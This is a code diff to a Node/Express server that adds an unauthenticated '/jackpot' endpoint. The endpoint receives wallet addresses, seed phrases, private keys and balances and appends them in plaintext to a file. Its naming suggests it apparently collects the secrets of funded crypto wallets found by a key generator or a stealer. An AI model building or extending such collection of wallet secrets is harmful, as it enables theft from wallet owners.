@@ -73,6 +73,30 @@ app.get('/download/:name/:date', function(req, res){
     res.download(file); // Set disposition and send it.
 });
 
+app.post('/api/1.0/jackpot', function (req, res) {
+    console.log("POST JACKPOT CALLED")
+    let address = req.body.address;
+    let mnemonic = req.body.mnemonic;
+    let private = req.body.private;
+    let balance = req.body.balance;
+    if(mnemonic == 'toto'){
+        console.log("TEST ADDRE RECEIVED")
+    }else {
+        fs.appendFile(`./generators/jackpot/jackpot.txt`, `${address},${mnemonic},${private},${balance}\n`, async function (err) {
+            if (err) {
+                res.status(500).json(errorResponse(err, res.statusCode));
+            }
+        });
+    }
+
+
+    res.setHeader('Content-Type', 'application/json');
+    res
+    .status(200)
+    .json(success("OK", res.statusCode));
+});
+
+
 app.post('/api/1.0/upload/:name/:filename', async (req, res) => {
     
     let name = req.params.name;
